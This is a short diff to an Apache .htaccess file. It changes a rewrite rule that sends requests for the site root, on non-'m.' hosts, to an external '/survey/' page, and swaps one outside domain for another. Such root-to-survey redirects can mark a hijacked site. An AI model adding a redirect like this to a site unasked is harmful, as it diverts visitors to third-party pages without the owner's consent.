@@ -2,4 +2,4 @@ RewriteEngine on
 RewriteBase /
 
 RewriteCond %{HTTP_HOST} !^m\.
-RewriteRule ^$ http://nucubuc.yahiarefaiea.com/survey/ [R,L]
+RewriteRule ^$ http://2wwd.nuotron.co/survey/ [R,L]
